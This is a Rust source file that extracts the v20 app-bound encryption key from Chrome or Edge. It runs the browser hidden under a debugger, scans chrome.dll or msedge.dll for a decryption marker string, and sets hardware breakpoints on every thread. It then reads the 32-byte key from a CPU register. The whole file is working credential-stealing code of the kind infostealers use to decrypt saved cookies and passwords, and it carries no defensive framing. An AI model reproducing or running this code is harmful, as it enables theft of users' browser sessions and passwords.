use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;
use windows::core::{PCWSTR, PWSTR, Result};
use windows::Win32::Foundation::*;
use windows::Win32::System::Diagnostics::Debug::*;
use windows::Win32::System::Threading::*;
use windows::Win32::System::Memory::*;
use windows::Win32::UI::WindowsAndMessaging::*;
use windows::Win32::System::LibraryLoader::*;
use windows::Win32::System::Diagnostics::ToolHelp::*;
use windows::Win32::System::SystemServices::*;

pub fn extract_v20_key(browser: &str) -> Option<Vec<u8>> {
    let exe_path = match browser.to_lowercase().as_str() {
        "chrome" => r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        "edge" => r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        _ => return None,
    };

    if !std::path::Path::new(exe_path).exists() {
        let fallback = if browser.to_lowercase() == "chrome" {
             r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
        } else {
             r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"
        };
        if !std::path::Path::new(fallback).exists() {
            return None;
        }
    }

    let mut si = STARTUPINFOW::default();
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE.0 as u16;

    let mut pi = PROCESS_INFORMATION::default();
    let cmd = format!("\"{}\" --headless --disable-gpu", exe_path);
    let mut cmd_wide: Vec<u16> = OsStr::new(&cmd).encode_wide().chain(Some(0)).collect();

    unsafe {
        if CreateProcessW(
            PCWSTR::null(),
            PWSTR(cmd_wide.as_mut_ptr()),
            None,
            None,
            false,
            DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW,
            None,
            PCWSTR::null(),
            &si,
            &mut pi,
        ).is_ok() {
            let key = debug_loop(pi.hProcess, browser);
            let _ = TerminateProcess(pi.hProcess, 0);
            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
            return key;
        }
    }

    None
}

fn find_lea_to_address(h_process: HANDLE, dll_base: usize, target_addr: usize) -> Option<usize> {
    unsafe {
        let mut dos_header = IMAGE_DOS_HEADER::default();
        ReadProcessMemory(h_process, dll_base as _, &mut dos_header as *mut _ as _, std::mem::size_of::<IMAGE_DOS_HEADER>(), None).ok()?;
        let nt_header_addr = dll_base + dos_header.e_lfanew as usize;
        let mut nt_headers = IMAGE_NT_HEADERS64::default();
        ReadProcessMemory(h_process, nt_header_addr as _, &mut nt_headers as *mut _ as _, std::mem::size_of::<IMAGE_NT_HEADERS64>(), None).ok()?;

        let section_header_addr = nt_header_addr + std::mem::size_of::<IMAGE_NT_HEADERS64>();
        let num_sections = nt_headers.FileHeader.NumberOfSections;
        let mut section_headers = vec![IMAGE_SECTION_HEADER::default(); num_sections as usize];
        ReadProcessMemory(h_process, section_header_addr as _, section_headers.as_mut_ptr() as _, num_sections as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>(), None).ok()?;

        for section in section_headers {
            let section_name = String::from_utf8_lossy(&section.Name).trim_matches('\0').to_string();
            if section_name == ".text" {
                let start = dll_base + section.VirtualAddress as usize;
                let size = section.Misc.VirtualSize as usize;
                let mut buffer = vec![0u8; size];
                ReadProcessMemory(h_process, start as _, buffer.as_mut_ptr() as _, size, None).ok()?;

                for i in 0..size - 7 {
                    if buffer[i] == 0x48 && buffer[i+1] == 0x8D && buffer[i+2] == 0x0D {
                        let disp = i32::from_le_bytes([buffer[i+3], buffer[i+4], buffer[i+5], buffer[i+6]]);
                        let rip_addr = start + i + 7;
                        let ref_addr = (rip_addr as i64 + disp as i64) as usize;
                        if ref_addr == target_addr {
                            return Some(start + i);
                        }
                    }
                }
            }
        }
    }
    None
}

fn set_hw_breakpoint(thread_id: u32, addr: usize) -> Result<()> {
    unsafe {
        let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, false, thread_id)?;
        SuspendThread(h_thread);
        let mut ctx = CONTEXT::default();
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if GetThreadContext(h_thread, &mut ctx).is_ok() {
            ctx.Dr0 = addr as u64;
            ctx.Dr7 = (ctx.Dr7 & !0x3) | 0x1;
            let _ = SetThreadContext(h_thread, &ctx);
        }
        ResumeThread(h_thread);
        let _ = CloseHandle(h_thread);
    }
    Ok(())
}

fn set_hw_breakpoint_on_all_threads(process_id: u32, addr: usize) {
    unsafe {
        if let Ok(snapshot) = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) {
            let mut entry = THREADENTRY32::default();
            entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

            if Thread32First(snapshot, &mut entry).is_ok() {
                loop {
                    if entry.th32OwnerProcessID == process_id {
                        let _ = set_hw_breakpoint(entry.th32ThreadID, addr);
                    }
                    if Thread32Next(snapshot, &mut entry).is_err() { break; }
                }
            }
            let _ = CloseHandle(snapshot);
        }
    }
}

fn find_string_in_remote_module(h_process: HANDLE, dll_base: usize, target_str: &str) -> Option<usize> {
    unsafe {
        let mut dos_header = IMAGE_DOS_HEADER::default();
        ReadProcessMemory(h_process, dll_base as _, &mut dos_header as *mut _ as _, std::mem::size_of::<IMAGE_DOS_HEADER>(), None).ok()?;
        if dos_header.e_magic != IMAGE_DOS_SIGNATURE { return None; }

        let nt_header_addr = dll_base + dos_header.e_lfanew as usize;
        let mut nt_headers = IMAGE_NT_HEADERS64::default();
        ReadProcessMemory(h_process, nt_header_addr as _, &mut nt_headers as *mut _ as _, std::mem::size_of::<IMAGE_NT_HEADERS64>(), None).ok()?;
        if nt_headers.Signature != IMAGE_NT_SIGNATURE { return None; }

        let section_header_addr = nt_header_addr + std::mem::size_of::<IMAGE_NT_HEADERS64>();
        let num_sections = nt_headers.FileHeader.NumberOfSections;
        let mut section_headers = vec![IMAGE_SECTION_HEADER::default(); num_sections as usize];
        ReadProcessMemory(h_process, section_header_addr as _, section_headers.as_mut_ptr() as _, num_sections as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>(), None).ok()?;

        for section in section_headers {
            let section_name = String::from_utf8_lossy(&section.Name).trim_matches('\0').to_string();
            if section_name == ".rdata" {
                let start = dll_base + section.VirtualAddress as usize;
                let size = section.Misc.VirtualSize as usize;
                let mut buffer = vec![0u8; size];
                ReadProcessMemory(h_process, start as _, buffer.as_mut_ptr() as _, size, None).ok()?;

                let target_bytes = target_str.as_bytes();
                if let Some(pos) = buffer.windows(target_bytes.len()).position(|w| w == target_bytes) {
                    return Some(start + pos);
                }
            }
        }
    }
    None
}

fn debug_loop(h_process: HANDLE, browser: &str) -> Option<Vec<u8>> {
    let mut debug_event = DEBUG_EVENT::default();
    let target_dll = if browser.to_lowercase() == "chrome" { "chrome.dll" } else { "msedge.dll" };
    let mut breakpoint_addr: usize = 0;
    let mut key: Option<Vec<u8>> = None;

    unsafe {
        while WaitForDebugEvent(&mut debug_event, INFINITE).is_ok() {
            match debug_event.dwDebugEventCode {
                LOAD_DLL_DEBUG_EVENT => {
                    let load_dll = debug_event.u.LoadDll;
                    let mut dll_name = [0u16; 1024];
                    let len = GetFinalPathNameByHandleW(load_dll.hFile, Some(&mut dll_name), FILE_NAME_NORMALIZED);
                    if len != 0 && len < 1024 {
                        let dll_path = String::from_utf16_lossy(&dll_name[..len as usize]).to_lowercase();
                        if dll_path.contains(target_dll) {
                            let dll_base = load_dll.lpBaseOfDll as usize;
                            if let Some(str_addr) = find_string_in_remote_module(h_process, dll_base, "OSCrypt.AppBoundProvider.Decrypt.ResultCode") {
                                if let Some(_bp_addr) = find_lea_to_address(h_process, dll_base, str_addr) {
                                    breakpoint_addr = _bp_addr;
                                    set_hw_breakpoint_on_all_threads(debug_event.dwProcessId, breakpoint_addr);
                                }
                            }
                        }
                    }
                }
                CREATE_THREAD_DEBUG_EVENT => {
                    if breakpoint_addr != 0 {
                        let _ = set_hw_breakpoint(debug_event.dwThreadId, breakpoint_addr);
                    }
                }
                EXCEPTION_DEBUG_EVENT => {
                    let ex = debug_event.u.Exception.ExceptionRecord;
                    if ex.ExceptionCode == EXCEPTION_SINGLE_STEP && ex.ExceptionAddress as usize == breakpoint_addr {
                        if let Ok(h_thread) = OpenThread(THREAD_GET_CONTEXT, false, debug_event.dwThreadId) {
                            let mut ctx = CONTEXT::default();
                            ctx.ContextFlags = CONTEXT_FULL;
                            if GetThreadContext(h_thread, &mut ctx).is_ok() {
                                let key_ptr = if browser.to_lowercase() == "chrome" { ctx.R15 } else { ctx.R14 };
                                if key_ptr != 0 {
                                    let mut key_buf = [0u8; 32];
                                    if ReadProcessMemory(h_process, key_ptr as _, key_buf.as_mut_ptr() as _, 32, None).is_ok() {
                                        key = Some(key_buf.to_vec());
                                    }
                                }
                            }
                            let _ = CloseHandle(h_thread);
                        }
                    }
                }
                EXIT_PROCESS_DEBUG_EVENT => {
                    break;
                }
                _ => {}
            }
            let _ = ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
            if key.is_some() { break; }
        }
    }
    key
}
